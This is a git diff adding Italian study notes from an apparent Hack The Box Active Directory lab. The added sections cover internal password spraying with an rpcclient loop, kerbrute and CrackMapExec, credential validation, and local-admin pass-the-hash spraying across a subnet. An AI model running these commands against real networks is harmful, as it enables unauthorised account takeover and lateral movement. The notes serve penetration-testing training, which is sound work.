@@ -282,7 +282,34 @@ Per fare uno spray attack dovremo prima enumerare utenti e avere una lista
 `j4k1dibe@htb[/htb]$  kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt `
 
 
+# Internal Password Spraying from Linux
+
+### Bash one liner
+`for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done`
+
+### Con kerbrute
+`j4k1dibe@htb[/htb]$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1`
+
+
 ## Enumerazione autenticata
 
 ### Con CrackMapExec
 `j4k1dibe@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users`
+
+### Usando CrackMapExec e filtrando Logon failures
+`j4k1dibe@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +`
+
+### Validiamo le credenziali trovtec on crackkmapexec
+`j4k1dibe@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u avazquez -p Password123`, Validiamo le credenziali
+
+## Local Admin password reuse
+
+Se riusciamo ad ottenere una password di un Admin locale Molto spesso lui usera' la stessa password pure sugli altri computer, identica.
+
+If we find a desktop host with the local administrator account password set to something unique such as $desktop%@admin123, it might be worth attempting $server%@admin123 against servers
+
+### Local Admin Spraying con crackmapexec
+`j4k1dibe@htb[/htb]$ sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +`
+
+la flag **--local-auth** specifica di provare il login solo una volta per macchina. Questo e' MOLTO IMPORTANTE.
+
